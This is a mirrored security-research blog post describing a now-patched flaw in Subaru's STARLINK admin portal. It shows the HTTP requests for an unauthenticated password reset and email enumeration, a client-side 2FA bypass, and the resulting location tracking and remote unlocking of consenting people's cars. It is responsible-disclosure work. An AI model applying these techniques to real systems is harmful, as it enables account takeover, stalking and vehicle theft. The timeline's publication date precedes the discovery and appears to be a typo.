<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://samcurry.net/hacking-subaru">Original</a>
    <h1>Hacking Subaru: Tracking and Controlling Cars via the Starlink Admin Panel</h1>
    
    <div id="readability-page-1" class="page"><div><h2 id="introduction">Introduction</h2>
<p>On November 20, 2024, Shubham Shah and I discovered a security vulnerability in Subaru’s STARLINK connected vehicle service that gave us unrestricted targeted access to all vehicles and customer accounts in the United States, Canada, and Japan.</p>
<p>Using the access provided by the vulnerability, an attacker who only knew the victim’s last name and ZIP code, email address, phone number, or license plate could have done the following:</p>
<ul>
<li>Remotely start, stop, lock, unlock, and retrieve the current location of any vehicle.</li>
<li>Retrieve any vehicle’s complete location history from the past year, accurate to within 5 meters and updated each time the engine starts.</li>
<li>Query and retrieve the personally identifiable information (PII) of any customer, including emergency contacts, authorized users, physical address, billing information (e.g., last 4 digits of credit card, excluding full card number), and vehicle PIN.</li>
<li>Access miscellaneous user data including support call history, previous owners, odometer reading, sales history, and more.</li>
</ul>
<p>After reporting the vulnerability, the affected system was patched within 24 hours and never exploited maliciously.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<iframe width="800" height="500" src="https://www.youtube.com/embed/0i8juy6RPBI?si=ZsJUYd6fKj36FthV" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
<p><em>Taking over a Subaru using only the license plate in about 10 seconds, retrieving over a years worth of location history from the vehicle</em></p>

<p><em>Map displaying 1,600 leaked coordinates from a 2023 Subaru Impreza, similar data was retrievable for any internet-connected Subaru</em></p>
<h2 id="vulnerability-writeup">Vulnerability Writeup</h2>
<p>A little over a year ago, I bought my mom a 2023 Subaru Impreza with the promise that she would let me borrow it to try and hack it. I’d spent the last few years hunting for vulnerabilities in other automakers, but didn’t yet have the chance to look at Subaru.</p>
<p>While visiting home for thanksgiving this year, I took my opportunity and asked for the account login to see if I could get anywhere.</p>
<h3 id="auditing-the-mysubaru-mobile-app">Auditing the MySubaru Mobile App</h3>
<p>The first thing I wanted to test was the MySubaru app. This app allowed users to send vehicle commands, so I proxied the app using Burp Suite and intercepted the telematic command HTTP requests, hoping to find a vulnerability to unlock cars without authorization.</p>
<p>The below request was sent when unlocking a car via the app:</p>
<pre><code><span>POST</span> <span>/g2v30/service/g2/unlock/execute.json;jsessionid=AE6E4482F5C4493A79C8F3BD656F8BBA</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>mobileapi.prod.subarucs.com</span>
<span>Content-Type:</span> <span>application/json</span>
<span>Connection:</span> <span>keep-alive</span>
<span>Accept:</span> <span>*/*</span>
<span>User-Agent:</span> <span>MySubaru-PROD-SOA/2024110100</span> <span>CFNetwork/1568.300.101</span> <span>Darwin/24.2.0</span>
<span>Content-Length:</span> <span>83</span>
<span>Accept-Language:</span> <span>en-US,en;q=0.9</span>
<span>Accept-Encoding:</span> <span>gzip,</span> <span>deflate,</span> <span>br</span>

{
  <span>&#34;delay&#34;:</span> <span>0</span>,
  <span>&#34;unlockDoorType&#34;:</span> <span>&#34;ALL_DOORS_CMD&#34;</span>,
  <span>&#34;vin&#34;:</span> <span>&#34;4S3GTAV64P3701234&#34;</span>,
  <span>&#34;pin&#34;:</span> <span>&#34;1234&#34;</span>
}
</code></pre>
<p>After failing to bypass the authorization for in-app vehicle commands, I looked around the app a bit more but couldn’t find anything interesting to test. Everything seemed properly secured. There weren’t a lot of endpoints. The authorization worked really well.</p>
<p>Maybe testing the MySubaru app was the wrong approach.</p>
<p>From my past experience with car companies, I knew there could be publicly accessible employee-facing applications with broader permissions than the customer-facing apps. With that in mind, I decided to shift focus and started hunting for other Subaru-related websites to test.</p>
<h3 id="finding-the-subaru-admin-panel">Finding the Subaru Admin Panel</h3>
<p>I sent my friend Shubs a message over Discord to see if he’d be interested in helping me find any potential Subaru employee applications. He said sure -- and then immediately sent me this message:</p>
<pre><code><span>shubs</span> <span>—</span> <span>11</span><span>/19/2024</span>
<span>have</span> <span>you</span> <span>seen</span> <span>this</span> <span>host</span> <span>before?</span>
<span>subarucs.com</span>
</code></pre>
<p>He noticed that ‘my.subaru.com’ (a domain that the MySubaru app was using) was a CNAME for ‘mys.prod.subarucs.com’ (a domain that I hadn’t seen before).</p>
<pre><code><span>nslookup</span> <span>my.subaru.com</span>
<span>Server:</span>         <span>127.0</span><span>.0</span><span>.53</span>
<span>Address:</span>        <span>127.0</span><span>.0</span><span>.53</span>

<span>Non-authoritative answer:</span>
<span>my.subaru.com</span>   <span>canonical</span> <span>name</span> <span>=</span> <span>www.mysubaru.com.</span>
<span>www.mysubaru.com</span>        <span>canonical</span> <span>name</span> <span>=</span> <span>mys.prod.subarucs.com.</span>
<span>Name:</span>   <span>mys.prod.subarucs.com</span>
</code></pre>
<p>We ran a scan to find other subdomains and checked the output:</p>
<pre><code><span>…</span>
<span>STARLINK®</span> <span>Admin</span> <span>Portal</span> <span>-</span> <span>https://portal.prod.subarucs.com/login.html</span>
<span>…</span>
</code></pre>
<p>Well, that definitely looked like employee functionality. From a quick Google, it appeared that STARLINK was the name of Subaru’s in-vehicle infotainment system which provided all of the remote functionality for the vehicle. This appeared to be an admin panel related to it.</p>
<figure><img alt="The Subaru STARLINK admin panel." loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=%2Fimages%2Fhacking-subaru%2Fn1.png&amp;w=640&amp;q=75 640w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fn1.png&amp;w=750&amp;q=75 750w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fn1.png&amp;w=828&amp;q=75 828w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fn1.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fn1.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fn1.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fn1.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fn1.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-subaru%2Fn1.png&amp;w=3840&amp;q=75"/><figcaption>The Subaru STARLINK admin panel.</figcaption></figure>
<h3 id="arbitrary-account-takeover-on-subaru-starlink-admin-portal">Arbitrary Account Takeover on Subaru STARLINK Admin Portal</h3>
<p>At first glance, it didn’t seem like there would be much here. It was just a login panel, and we didn’t have any credentials. I checked the source of the website hoping to see a bit more, and the following bit caught my eye:</p>
<pre><code><span>&lt;<span>script</span> <span>type</span>=<span>&#34;text/javascript&#34;</span> <span>src</span>=<span>&#34;/assets/_js/starlinkEnroll.js&#34;</span>&gt;</span><span>&lt;/<span>script</span>&gt;</span>
</code></pre>
<p>There were some interesting JavaScript files under the “/assets/_js/” folder that were loaded into the login page, so I went ahead and brute forced the directory in hopes of finding other JavaScript files.</p>
<p>After a few minutes of running <a href="https://github.com/ffuf/ffuf">FFuF</a>, we got a hit for a “login.js” file which the following very interesting code snippet:</p>
<pre><code>$(<span>&#39;#new_password_submit&#39;</span>).<span>on</span>(<span>&#39;click&#39;</span>, <span>function</span>(<span>e</span>) {
	e.<span>preventDefault</span>();
	<span>if</span>($(<span>&#39;#forgot-password-step4-form&#39;</span>).<span>valid</span>()) {
		<span>disableBtns</span>();
		$.<span>ajax</span>({
            <span>url</span>: <span>&#34;/forgotPassword/resetPassword.json&#34;</span>,
			<span>type</span>: <span>&#34;POST&#34;</span>,
            <span>contentType</span>: <span>&#34;application/json&#34;</span>,
            <span>data</span>: <span>JSON</span>.<span>stringify</span>({
                <span>email</span>: email,
                <span>password</span>: $(<span>&#39;#new_password&#39;</span>).<span>val</span>(),
                <span>passwordConfirmation</span>: $(<span>&#39;#confirm_new_password&#39;</span>).<span>val</span>()
            }),
			<span>async</span>: <span>false</span>
		}).<span>done</span>(<span>function</span> (<span>response</span>) {
</code></pre>
<p>It appeared that there was a “resetPassword.json” endpoint that would reset employee’s accounts without a confirmation token!</p>
<p>If this worked how it was written in the JavaScript, then an attacker could simply enter any valid employee email and take over their account. I sent the following POST request to confirm that the functionality was even accessible:</p>
<p><strong>HTTP Request</strong></p>
<pre><code><span>POST</span> <span>/forgotPassword/resetPassword.json</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>portal.prod.subarucs.com</span>

{
  <span>&#34;email&#34;:</span> <span>&#34;random@random.com&#34;</span>,
  <span>&#34;password&#34;:</span> <span>&#34;Example123!&#34;</span>,
  <span>&#34;passwordConfirmation&#34;:</span> <span>&#34;Example123!&#34;</span>
}
</code></pre>
<p><strong>HTTP Response</strong></p>
<pre><code><span>HTTP/1.1</span> <span>200</span>
<span>Content-type:</span> <span>application/json</span>
<span>Content-length:</span> <span>7</span>

<span>“error”</span>
</code></pre>
<p>It seemed to be working, we just needed to find an employee’s email address to test it on. Since this was a fairly large application, there were probably a bunch of different users, we just needed to find some way to enumerate them. I dug through the rest of the JS looking for an endpoint that might let us enumerate emails until I saw the following:</p>
<p><strong>HTTP Request</strong></p>
<pre><code><span>GET</span> <span>/adminProfile/getSecurityQuestion.json?email=example@example.com</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>portal.prod.subarucs.com</span>
</code></pre>
<p><strong>HTTP Response</strong></p>
<pre><code><span>HTTP/1.1</span> <span>200</span>
<span>Content-type:</span> <span>application/json</span>
<span>Content-length:</span> <span>7</span>

{
  <span>&#34;error&#34;:</span> <span>&#34;Invalid email&#34;</span>
}
</code></pre>
<p>The above endpoint would return the user’s security questions if their email was valid. We could use this to enumerate user accounts until we found someone that was active on this platform.</p>
<h3 id="enumerating-employee-emails">Enumerating Employee Emails</h3>
<p>Using LinkedIn, we did a quick search for “Subaru STARLINK” and found a few employees who appeared to be software engineers. After getting their names, we Googled and found that Subaru emails are in the following format:</p>
<pre><code>[<span>first_initial</span>][<span>last</span>]<span>@subaru.com</span>
</code></pre>
<p>We tossed the few emails that we’d pieced together into the “getSecurityQuestion.json” endpoint and hit send. On the fourth attempt, we got a response back!</p>
<pre><code><span>&lt;<span>label</span> <span>for</span>=<span>&#34;securityQuestionId&#34;</span>&gt;</span>
  <span>&lt;<span>span</span> <span>class</span>=<span>&#34;securityQuestionText&#34;</span>&gt;</span>What city were you born in?<span>&lt;/<span>span</span>&gt;</span>
<span>&lt;/<span>label</span>&gt;</span>
</code></pre>
<p>The <code>jdoe@subaru.com</code> (redacted) email was valid! We went back to the reset password endpoint and hit send.</p>
<p><strong>HTTP Request</strong></p>
<pre><code><span>POST</span> <span>/forgotPassword/resetPassword.json</span> <span>HTTP/1.1</span>
<span>Host:</span> <span>portal.prod.subarucs.com</span>

{
  <span>&#34;email&#34;:</span> <span>&#34;jdoe@subaru.com&#34;</span>,
  <span>&#34;password&#34;:</span> <span>&#34;Example123!&#34;</span>,
  <span>&#34;passwordConfirmation&#34;:</span> <span>&#34;Example123!&#34;</span>
}
</code></pre>
<p><strong>HTTP Response</strong></p>
<pre><code><span>HTTP/1.1</span> <span>200</span>
<span>Date:</span> <span>Wed,</span> <span>20</span> <span>Nov</span> <span>2024 03:02:31 </span><span>GMT</span>
<span>Content-Type:</span> <span>application/json</span>
<span>Connection:</span> <span>close</span>
<span>X-Frame-Options:</span> <span>SAMEORIGIN</span>
<span>Content-Length:</span> <span>9</span>

<span>&#34;success&#34;</span>
</code></pre>
<p>It worked! We tried logging in.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=%2Fimages%2Fhacking-subaru%2F1.png&amp;w=640&amp;q=75 640w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F1.png&amp;w=750&amp;q=75 750w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F1.png&amp;w=828&amp;q=75 828w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F1.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F1.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F1.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F1.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F1.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-subaru%2F1.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure>
<p>We had successfully taken over an employee’s account, but there was now a 2FA prompt to actually use the website. It was custom, so we tried to see if there was anything to do to bypass it.</p>
<h3 id="bypassing-2fa">Bypassing 2FA</h3>
<p>We tried the simplest thing that we could think of: removing the client-side overlay from the UI.</p>
<p><strong>Match</strong></p>
<pre><code>$(<span>&#39;#securityQuestionModal&#39;</span>).<span>modal</span>(<span>&#39;show&#39;</span>);
</code></pre>
<p><strong>Replace</strong></p>
<pre><code>
</code></pre>
<p>After removing the client-side overlay, we clicked around and the whole app seemed to function normally. All of the buttons worked, and were returning server-side data.</p>
<figure><img alt="2FA bypassed." loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=%2Fimages%2Fhacking-subaru%2Fmysub.png&amp;w=640&amp;q=75 640w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fmysub.png&amp;w=750&amp;q=75 750w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fmysub.png&amp;w=828&amp;q=75 828w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fmysub.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fmysub.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fmysub.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fmysub.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fmysub.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-subaru%2Fmysub.png&amp;w=3840&amp;q=75"/><figcaption>2FA bypassed.</figcaption></figure>
<h3 id="tracking-my-mom-for-the-last-year">Tracking My Mom for the Last Year</h3>
<p>The left navbar had a ton of different functionality, but the juiciest sounding one was “Last Known Location”. I went ahead and typed in my mom’s last name and ZIP code. Her car popped up in the search results. I clicked it and saw everywhere my mom had traveled the last year:</p>
<table><thead><tr><th>Date</th><th>Odometer</th><th>Location</th></tr></thead><tbody><tr><td>11/21/2024 6:18:56 PM</td><td>14472.6</td><td>41.30136,-96.161142</td></tr><tr><td>11/21/2024 4:59:51 AM</td><td>14472.6</td><td>41.301402,-96.161134</td></tr><tr><td>11/21/2024 4:49:02 AM</td><td>14472.6</td><td>41.301286,-96.161145</td></tr><tr><td>…</td><td>…</td><td>…</td></tr><tr><td>11/02/2023 1:44:24 PM</td><td>6440.6</td><td>41.256003,-96.080627</td></tr><tr><td>11/01/2023 9:52:47 PM</td><td>6432.5</td><td>41.301248,-96.159951</td></tr><tr><td>11/01/2023 12:16:02 PM</td><td>6425.2</td><td>41.259397,-96.078775</td></tr></tbody></table>
<p>The “Last Known Location” endpoint was more than the last location, it gave me the exact coordinates of everywhere that she had started her engine or used a telematics command over the <strong>last year</strong>. I didn’t realize this data was being collected, but it seemed that we had agreed to the STARLINK enrollment when we purchased it.</p>
<p>To better understand the data, I exported a year’s worth of location history from my mom’s 2023 Impreza and imported it into the Google Maps iframe below. She kindly gave her permission to share it, saying that her life is &#34;too boring&#34; for anyone to misuse the information.</p>
<h3 id="visualizing-a-year-of-subaru-location-history">Visualizing a Year of Subaru Location History</h3>

<p><em>Map displaying 1,600 leaked coordinates from a 2023 Subaru Impreza, similar data was retrievable for any internet-connected Subaru</em></p>
<figure><img alt="Our STARLINK purchase agreement history, accessible from the admin panel." loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=%2Fimages%2Fhacking-subaru%2F3.png&amp;w=640&amp;q=75 640w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F3.png&amp;w=750&amp;q=75 750w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F3.png&amp;w=828&amp;q=75 828w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F3.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F3.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F3.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F3.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F3.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-subaru%2F3.png&amp;w=3840&amp;q=75"/><figcaption>Our STARLINK purchase agreement history, accessible from the admin panel.</figcaption></figure>
<p>There were a ton of other endpoints. One of them was a vehicle search which let you query a customer’s last name and zip code, phone number, email address, or VIN number (retrievable via license plate) and grant/modify access to their vehicle.</p>
<figure><img alt="Retrieving street address, phone number, email, emergency contacts, authorized users, and billing information of any Subaru STARLINK customer." loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=%2Fimages%2Fhacking-subaru%2F4.png&amp;w=640&amp;q=75 640w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F4.png&amp;w=750&amp;q=75 750w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F4.png&amp;w=828&amp;q=75 828w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F4.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F4.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F4.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F4.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F4.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-subaru%2F4.png&amp;w=3840&amp;q=75"/><figcaption>Retrieving street address, phone number, email, emergency contacts, authorized users, and billing information of any Subaru STARLINK customer.</figcaption></figure>
<figure><img alt="The STARLINK search functionality which allows you to search via zip code and last name, VIN, email address, and phone number." loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=%2Fimages%2Fhacking-subaru%2F6.png&amp;w=640&amp;q=75 640w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F6.png&amp;w=750&amp;q=75 750w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F6.png&amp;w=828&amp;q=75 828w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F6.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F6.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F6.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F6.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F6.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-subaru%2F6.png&amp;w=3840&amp;q=75"/><figcaption>The STARLINK search functionality which allows you to search via zip code and last name, VIN, email address, and phone number.</figcaption></figure>
<h3 id="unlocking-a-friends-car">Unlocking a Friend’s Car</h3>
<p>After searching and finding my own vehicle in the dashboard, I confirmed that the STARLINK admin dashboard should have access to pretty much any Subaru in the United States, Canada, and Japan. We wanted to confirm that there was nothing we were missing, so we reached out to a friend and asked if we could hack her car to demonstrate that there was no pre-requisite or feature which would’ve actually prevented a full vehicle takeover.</p>
<p>She sent us her license plate, we pulled up her vehicle in the admin panel, then finally we added ourselves to her car.</p>
<figure><img alt="Adding ourselves as an authorized user to our friend&#39;s Subaru to demonstrate that we could execute commands on their vehicle." loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=%2Fimages%2Fhacking-subaru%2F7.png&amp;w=640&amp;q=75 640w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F7.png&amp;w=750&amp;q=75 750w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F7.png&amp;w=828&amp;q=75 828w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F7.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F7.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F7.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F7.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=%2Fimages%2Fhacking-subaru%2F7.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-subaru%2F7.png&amp;w=3840&amp;q=75"/><figcaption>Adding ourselves as an authorized user to our friend&#39;s Subaru to demonstrate that we could execute commands on their vehicle.</figcaption></figure>
<p>We waited a few minutes, then we saw that our account had been created successfully.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=%2Fimages%2Fhacking-subaru%2Fxzf.png&amp;w=640&amp;q=75 640w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fxzf.png&amp;w=750&amp;q=75 750w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fxzf.png&amp;w=828&amp;q=75 828w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fxzf.png&amp;w=1080&amp;q=75 1080w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fxzf.png&amp;w=1200&amp;q=75 1200w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fxzf.png&amp;w=1920&amp;q=75 1920w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fxzf.png&amp;w=2048&amp;q=75 2048w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fxzf.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-subaru%2Fxzf.png&amp;w=3840&amp;q=75"/><figcaption></figcaption></figure>
<p>Now that we had access, I asked if they could peek outside and see if anything was happening with their car. I sent the “unlock” command. They then sent us this video.</p>
<figure><img alt="Success!" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="/_next/image?url=%2Fimages%2Fhacking-subaru%2Fring.gif&amp;w=640&amp;q=75 640w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fring.gif&amp;w=750&amp;q=75 750w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fring.gif&amp;w=828&amp;q=75 828w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fring.gif&amp;w=1080&amp;q=75 1080w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fring.gif&amp;w=1200&amp;q=75 1200w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fring.gif&amp;w=1920&amp;q=75 1920w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fring.gif&amp;w=2048&amp;q=75 2048w, /_next/image?url=%2Fimages%2Fhacking-subaru%2Fring.gif&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-subaru%2Fring.gif&amp;w=3840&amp;q=75"/><figcaption>Success!</figcaption></figure>
<p>Afterwards, she confirmed that she did not receive any notification, text message, or email after we added ourselves as an authorized user and unlocked her car.</p>
<h2 id="timeline">Timeline</h2>
<ul>
<li>11/20/24 11:54 PM CST: Initial report sent to SecOps email</li>
<li>11/21/24 7:40 AM CST: Initial response from Subaru team</li>
<li>11/21/24 4:00 PM CST: Vulnerability fixed, unable to reproduce</li>
<li>01/23/24 6:00 AM CST: Blog post released</li>
</ul>
<h2 id="addendum">Addendum</h2>
<p>When writing this, I had a really hard time trying to do another blog post on car hacking. Most readers of this blog already work in security, so I really don’t think the actual password reset or 2FA bypass techniques are new to anyone. The part that I felt was worth sharing was the impact of the bug itself, and how the connected car systems actually work.</p>
<p>The auto industry is unique in that an 18-year-old employee from Texas can query the billing information of a vehicle in California, and it won’t really set off any alarm bells. It’s part of their normal day-to-day job. The employees all have access to a ton of personal information, and the whole thing relies on trust.</p>
<p>It seems really hard to really secure these systems when such broad access is built into the system by default.</p>
<h2 id="thanks">Thanks</h2>
<p>Happy (late) holidays, thanks for reading! Huge thanks to the following people for helping write and review this post:</p>
<ul>
<li>Gren (<a href="https://bsky.app/profile/grenlith.bsky.social">https://bsky.app/profile/grenlith.bsky.social</a>)</li>
<li>Ian Carroll (<a href="https://x.com/iangcarroll">https://x.com/iangcarroll</a>)</li>
<li>Justin Rhinehart (<a href="https://twitter.com/sshell">https://twitter.com/sshell</a>_)</li>
<li>Joseph Thacker (<a href="https://x.com/rez0">https://x.com/rez0</a>__)</li>
<li>Brett Buerhaus (<a href="https://x.com/bbuerhaus">https://x.com/bbuerhaus</a>)</li>
<li>Maik Robert (<a href="https://x.com/xehle">https://x.com/xehle</a>_)</li>
<li>Joel Margolis (<a href="https://x.com/0xteknogeek">https://x.com/0xteknogeek</a>)</li>
</ul></div></div>
  </body>
</html>
